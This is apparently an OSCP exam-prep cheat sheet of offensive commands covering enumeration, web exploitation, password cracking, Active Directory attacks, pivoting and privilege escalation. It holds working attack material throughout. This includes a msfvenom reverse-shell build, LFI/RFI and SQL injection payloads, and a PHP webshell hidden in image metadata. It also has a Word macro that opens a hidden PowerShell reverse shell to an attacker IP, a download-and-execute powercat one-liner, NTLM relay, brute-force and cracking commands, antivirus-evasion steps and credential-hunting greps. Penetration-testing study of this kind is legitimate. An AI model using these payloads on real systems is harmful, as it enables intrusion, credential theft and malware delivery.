# OSCP Command Cheat Sheet

Curated from the OSCP Assessment Template with added quick wins for both Linux and Windows targets.

## One Liner for exploit prep

```bash
cp $(locate pspy64) .; cp $(locate mimikatz.exe) . ;  cp $(locate nc.exe) . ; cp $(locate linpeas.sh) . ; cp $(locate winPEASx64.exe) . ; wget https://github.com/dievus/printspoofer/raw/refs/heads/master/PrintSpoofer.exe ; msfvenom -p windows/x64/shell_reverse_tcp -f exe LHOST=192.168.45.211 LPORT=4444 > rv.exe; ls -la; python3 -m http.server 80
```

## One liner for directory
```bash
mkdir AD ; mkdir Box; mkdir -p screen/Box; mkdir -p screen/AD;
```

## Network & Discovery
- `sudo nmap -sn <cidr>` – Fast discovery of live hosts via ICMP/ARP.
- `arp-scan <cidr>` – Layer 2 discovery for hosts that ignore ICMP.
- `nmap -sC -sV -p- <target>` – Full TCP enumeration with scripts and version detection.
- `nmap -sU --top-ports 100 <target>` – Lightweight UDP scan of common services.
- `whatweb <url>` – Fingerprint web technologies.
- `ffuf -u http://<host>/FUZZ -w /path/to/wordlist.txt -ic` – OWASP-style quick fuzz of directories/files.
- `gobuster dir -u http://<host> -w /path/to/wordlist.txt -x php,txt,bak` – Directory brute-force for low-effort web wins.
- `nikto -h http://<host>` – Catch obvious web misconfigurations.
- `zap-baseline.py -t http://<host>` – Rapid OWASP ZAP passive scan for easy findings.

## Web Application Testing
### Web Enumeration Examples
- `sudo nmap -p80  -sV 192.168.50.20` – Identify web server version.
- `gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5` – Discover hidden directories.
- `gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -x php,txt,html -t 10` – Deeper directory enumeration.
-  Debug Page Content: Look for comments, hidden fields, or debug info in HTML source.
-  Enumerate API:
   * patterns
    ```bash
    {GOBUSTER}/v1
    {GOBUSTER}/v2
    ```
   - `gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern` – Fuzz for API endpoints.
 - `curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login` – Test API login functionality.
   - If logoin successful, you should receive a token like below:
    ```bash
    kali@kali:~$ curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

     {"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew", "message": "Successfully logged in.", "status": "success"}

    kali@kali:~$ curl  \
    'http://192.168.50.16:5002/users/v1/admin/password' \
    -H 'Content-Type: application/json' \
    -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
    -d '{"password": "pwned"}'

    {
    "detail": "The method is not allowed for the requested URL.",
    "status": 405,
    "title": "Method Not Allowed",
    "type": "about:blank"
    }
    
    ```
- Check cross-site scripting stored or reflected 
    * https://gist.github.com/michenriksen/d729cd67736d750b3551876bbedbe626
    * XSS simple payload : https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/#tools
    * XSS Polyglot : https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/2%20-%20XSS%20Polyglot/
- .htaccess upload to restrict access to certain files https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/
  
  - .htaccess file 
    ```bash
    # .htaccess
    <FilesMatch "\.(php|php5|phtml|html|htm|js|css|exe|pl|py|sh|rb|cgi)$">
    Order Allow,Deny
    Deny from all
    </FilesMatch>

    AddType application/x-httpd-php .htaccess
    ```

### Webshells

- PHP windows reverse shell https://github.com/Dhayalanb/windows-php-reverse-shell

### Web Exploitation

- Local File Inclusion (LFI) to Remote Code Execution (RCE) example (find application config for password, upload webshell, user enumeration, ssh private):
  - `http://<target>/index.php?page=../../../../etc/passwd` – Test for LFI vulnerability. (log poison if possible)
- PHP wrapper
  - Data rapper : `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"`
  - Php rapper : `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php`
- Remote File Inclusion (RFI) example:
  - `curl "http://mountaindesserts.com/meteor/index.php?page=http://<attacker ip>/simple-backdoor.php&cmd=ls"` – Host a simple webshell on your machine.
- File upload:
    - upload ssh key to web server
        ```bash
        kali@kali:~$ ssh-keygen
        Generating public/private rsa key pair.
        Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
        Enter passphrase (empty for no passphrase): 
        Enter same passphrase again: 
        Your identification has been saved in fileup
        Your public key has been saved in fileup.pub
        ...

        kali@kali:~$ cat fileup.pub > authorized_keys
        ```
    - upload php webshell to web server 
      - https://revshells.com/
    - upload hidden webshell in image file
      - https://github.com/convisolabs/CVE-2021-22204-exiftool/blob/master/exploit.py
      - `exiftool -comment='<?php system($_GET["cmd"]); ?>' image.jpg` – Embed PHP webshell in image metadata.
- Command Injection
  - `http://<target>/index.php?page=ping&ip=
  - find exploitable parameter in the web request that passes user input to system commands.
- SQL injection
    - payloads
    ```bash
    admin' OR 1=1 -- //
    ' ORDER BY 1-- //
    %' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //
    %' UNION SELECT database(), user(), @@version, null, null -- //
    ' UNION SELECT null, null, database(), user(), @@version  -- //
    ' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
    ' UNION SELECT null, username, password, description, null FROM users -- //
    AND 1=1 -- //
    AND IF (1=1, sleep(3),'false') -- //
    ```
    - impacket-mssqlclient
    ```bash
    kali@kali:~$ impacket-mssqlclient -windows-auth -target-ip
    enable_xp_cmdshell  -- To enable xp_cmdshell
    xp_cmdshell 'whoami'  -- To execute command
    
    enum_users  -- To enumerate users
    enum_impersonate -- Check for impersonation possibilities
    exec_as_login <login_name>  -- To impersonate a login

    enum_links -- To enumerate linked servers
    use_link <linked_server_name>  -- To use linked server
    ```
- Client-Side Attacks
  - Windows Word Macros
    - Create a Word document with a macro that opens a reverse shell when the document is opened.
    - View --> Macros --> Create new macro and paste the code below.
    - Example VBA code:
        ```vba
        Sub AutoOpen()
            Dim strCmd As String
            strCmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',ATTACKER_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
            CreateObject("WScript.Shell").Run strCmd, 0, False
        End Sub
        ```

    - Replace `ATTACKER_IP` and `ATTACKER_PORT` with your listener's IP and port.

    - Setup python simple HTTP server to host the document:
    
        ```bash
        python3 -m http.server 80
        ```

        ```bash
        IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
        ```

    - Set up a listener on your machine:
        
        ```bash
        nc -lvnp 4444
        ```

## Fix exploitation

* [ ] Change port number if default port is blocked by firewall.
* [ ] Change the shellcode architecture (x86, x64) to match target system.
* [ ] Fix payload.
* [ ] Encode the payload to bypass antivirus or IDS/IPS systems.
* [ ] Use different payload types (reverse shell, bind shell, meterpreter) based on the situation.
* [ ] Use different target upload location.


### Install MinGW on Kali Linux
`sudo apt install mingw-w64` – Install MinGW for cross-compiling Windows binaries on Linux.

### Cross-Compile Exploit Code
`i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe` – Compile exploit code to Windows executable.
`i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32` – Compile with Winsock library if needed.0

### AV Bypass with Shellcode Encoding

```bash
sudo apt install wine
sudo dpkg --add-architecture i386 && apt-get update &&
apt-get install wine32
sudo apt install wine

sudo dpkg --add-architecture amd64
sudo  apt install -y qemu-user-static binfmt-support
sudo apt-get update && apt-get install wine32

msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
```

![alt text](https://static.offsec.com/offsec-courses/PEN-200/imgs/antivirus_evasion/7c49cd2d7e2afd9639c73a1de9b7765a-antivirus_evasion_06.png)

![alt text](https://static.offsec.com/offsec-courses/PEN-200/imgs/antivirus_evasion/61057955413c0439bd528b59c6a814a1-antivirus_evasion_07.png)

![alt text](https://static.offsec.com/offsec-courses/PEN-200/imgs/antivirus_evasion/f1c4ae36fc63adf510fdc4712a928fc8-antivirus_evasion_08.png)

![alt text](https://static.offsec.com/offsec-courses/PEN-200/imgs/antivirus_evasion/f116295bbacceb3e7ba812feed277d09-antivirus_evasion_09.png)

## Password Attacks & Credential Harvesting
- `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201` – SSH password brute-force.
- `hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202` – RDP username brute-force with a common password.
- `hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"` – Web form password brute-force.
- `keepass2john Database.kdbx > keepass.hash` – Extract KeePass hashes for cracking.
  - `hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force` – Crack KeePass hashes with Hashcat.
- `ssh2john id_rsa > ssh.hash` – Extract SSH private key hash for cracking.
  - `john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash` – Crack SSH key passphrase with John the Ripper.
  - `hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force` – Crack SSH key passphrase with Hashcat.
  - `hashcat -h | grep -i "ssh"` – List SSH-related Hashcat modes.
  - ssh rule
    ```bash
    kali@kali:~/passwordattacks$ cat ssh.rule
    [List.Rules:sshRules]
    c $1 $3 $7 $!
    c $1 $3 $7 $@
    c $1 $3 $7 $#

    kali@kali:~/passwordattacks$ sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'

    john --wordlist=ssh.passwords --rules=sshRules ssh.hash
    ```
- `hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` – Crack NTLM hashes with Hashcat.
    - NTLM hash mode reference
    ```bash
    kali@kali:~/passwordattacks$ hashcat --help | grep -i "ntlm"   
                                                                            
   5500 | NetNTLMv1 / NetNTLMv1+ESS                           | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                      | Network Protocol
   5600 | NetNTLMv2                                           | Network Protocol
  27100 | NetNTLMv2 (NT)                                      | Network Protocol
   1000 | NTLM                                                | Operating System
    ```
- `hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force` – Crack NetNTLMv2 hashes with Hashcat.
- Net-NTLMv2 relaying
- `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA...""` – Relay captured Net-NTLMv2 hashes to execute commands on target systems. ( revershell with powershell nc ip 8080 payload)
  - `nc -lvnp 8080` – Set up a listener to catch reverse shells from relayed commands.
- `impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248` - 
## Host Enumeration – Linux
- `uname -a` – Kernel and architecture info.
- `hostnamectl` – Hostname, OS, and hardware summary.
- `ip a; ip route` – Interface and routing insight.
- `ss -tulnp` – Listening sockets and owning processes.
- `sudo -l` – Discover permitted sudo commands.
- `find / -perm -4000 -type f 2>/dev/null` – SUID binary sweep.
- `cat /etc/passwd | cut -d: -f1` – List local users.
- `linpeas.sh` – Automated privilege escalation checks (`./linpeas.sh`).
- `./pspy64 -pf -i 5` – Watch scheduled tasks and processes without root.

## Host Enumeration – Windows
- `systeminfo` – OS version, roles, hotfix baseline.
- `ipconfig /all` – Network layout.
- `whoami /all` – Identity, groups, and privileges.
- `netstat -ano` – Active network connections and PIDs.
- `tasklist /svc` – Running services and owning processes.
- `wmic qfe get Caption,Description,HotFixID,InstalledOn` – Patch inventory.
- `winPEAS.exe /quiet` – Automated Windows privilege escalation checks.

## Credential & Service Abuse (nxc + quick wins)
- `nxc smb <target>/24 -u <user> -p <pass> --shares` – Enumerate SMB shares with credential reuse.
- `nxc smb <target> -u users.txt -p passwords.txt --no-brute` – Password spray with lockout-safe timing.
- `nxc winrm <target> -u <user> -p <pass> -x "whoami"` – Test WinRM command execution.
- `nxc rdp <target> -u <user> -p <pass>` – Validate RDP credential success and NLA status.
- `nxc ssh <target> -u <user> -p <pass>` – SSH credential testing.

## Kerberos & AD Tooling
- `nltest /dsgetdc:<domain>` – Identify the domain controller.
- `nslookup -type=SRV _ldap._tcp.<domain>` – Locate LDAP SRV records.
- `kerbrute userenum --dc <dc_ip> -d <domain> <userlist>` – Spray for valid domain users.
- `GetADUsers.py <domain>/<user>:<pass> -all` – Dump AD users via LDAP (Impacket).
- `GetNPUsers.py <domain>/<user>:<pass> -request` – AS-REP roasting collection.
- `GetUserSPNs.py <domain>/<user>:<pass> -request` – Kerberoasting for service accounts.
- `Rubeus.exe asktgt /user:<user> /password:<pass>` – Request TGTs (aka "Rubese"); swap `/rc4` or `/ptt` for alternate modes.
- `certipy find -u <user>@<domain> -p <pass> -dc-ip <dc_ip>` – Discover AD CS misconfigurations.
- `bloodhound-python -u <user> -p <pass> -ns <dc_ip> -d <domain> -c All` – Collect BloodHound ingestors.
- `ldapdomaindump -u <user> -p <pass> ldap://<dc_ip>` – Export AD objects for offline review.

## Pivoting & Tunneling
- `ligolo-ng proxy -listen 0.0.0.0:11601 -selfcert` – Operator-side listener setup.
- `./agent -connect <operator_ip>:11601 -ignore-cert -relay 0.0.0.0:1080` – Compromised host agent to start SOCKS tunnel.
- `ifconfig tun0` (Linux) / `ipconfig` (Windows) – Verify tunnel interface once ligolo is running.
- `ssh -L <local_port>:<internal_host>:<internal_port> <user>@<pivot>` – Traditional SSH local port forward when available.

## Exploitation & Priv-Esc Execution
- `PrintSpoofer64.exe -i -c cmd.exe` – Weaponize SeImpersonatePrivilege for SYSTEM shell.
- `GodPotato.exe -cmd "cmd.exe"` – Alternate SeImpersonate exploit for modern builds.
- `wmiexec.py <domain>/<user>:<pass>@<target>` – Execute commands remotely (Impacket).
- `psexec.py <domain>/<user>:<pass>@<target>` – Drop service for SYSTEM shell via SMB.
- `evil-winrm -i <target> -u <user> -p <pass>` – PowerShell remoting with convenience features.
- `./linpeas.sh` / `winPEAS.exe` – Keep handy for immediate post-exploitation enumeration.

## Config & Credential Leaks – Linux
- `grep -R \"password\" /etc/* 2>/dev/null` – Sweep system configs for clear-text credentials.
- `grep -R \"passw\" /var/www -n 2>/dev/null` – Hunt web app secrets inside code and configs.
- `grep -R \"DB_USER\\|DB_PASS\" /opt /var -n 2>/dev/null` – Locate database credential variables.
- `find / -type f -iname \"*config*\" -size -2M 2>/dev/null | grep -Ei \"(db|cred|pass)\"` – Surface small readable config files likely to hold secrets.
- `grep -R \"AWS_ACCESS_KEY_ID\" /home 2>/dev/null` – Search user directories for cloud keys.
- `grep -R \"sshpass\" / -n 2>/dev/null` – Detect scripted SSH password usage.
- `strings /var/lib/tomcat*/conf/* | grep -i pass` – Extract credentials from Java/Tomcat configs.
- `awk -F= '/password/ {print FILENAME\":\"$0}' $(find /etc -name \"*.ini\" -o -name \"*.conf\" 2>/dev/null)` – Report ini/conf entries containing “password”.

## Config & Credential Leaks – Windows
- `findstr /si \"password\" C:\\Users\\*\\AppData\\Roaming\\*.ini C:\\inetpub\\wwwroot\\*.*` – Search user and web configs.
- `findstr /spin \"password\" *.xml *.config *.ini` – Recursive clear-text search from current directory.
- `findstr /spin \"connectionString\" C:\\inetpub\\wwwroot\\*.config` – Identify DB connection strings in web apps.
- `findstr /spin \"pass\" C:\\ProgramData\\*.ini C:\\ProgramData\\*.txt` – Scan application data for secrets.
- `Get-ChildItem -Path C:\\ -Include *.config,*.ini,*.xml -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern \"password\",\"secret\"` – PowerShell-wide search for credential terms.
- `Get-ChildItem C:\\Users -Filter *.rdp -Recurse | Select-String -Pattern \"password 51\"` – Spot embedded RDP credential blobs.
- `reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword` – Check for auto-login passwords.
- `reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" /s | find \"HostName\"` – Pull PuTTY session targets to review saved creds.

## Post-Exploitation Essentials
- `whoami && id` – Confirm privilege level on Linux.
- `hostname && ip a` – Document host and interface data.
- `dir C:\Users\*\Desktop` / `ls /home/*` – Hunt for proof flags.
- `tar czf /tmp/loot.tgz <files>` / `Compress-Archive` – Package artifacts for exfil when allowed.
- `del <uploaded_file>` / `rm <file>` – Clean up tooling per exam rules.

## Tool & Exploit References
- linPEAS: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
- winPEAS: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
- ligolo-ng: https://github.com/nicocha30/ligolo-ng
- PrintSpoofer: https://github.com/dievus/printspoofer
- GodPotato: https://github.com/BeichenDream/GodPotato
- pspy (pspy64): https://github.com/DominicBreuker/pspy
- Rubeus: https://github.com/GhostPack/Rubeus
- NetExec (nxc): https://github.com/Pennyw0rth/NetExec
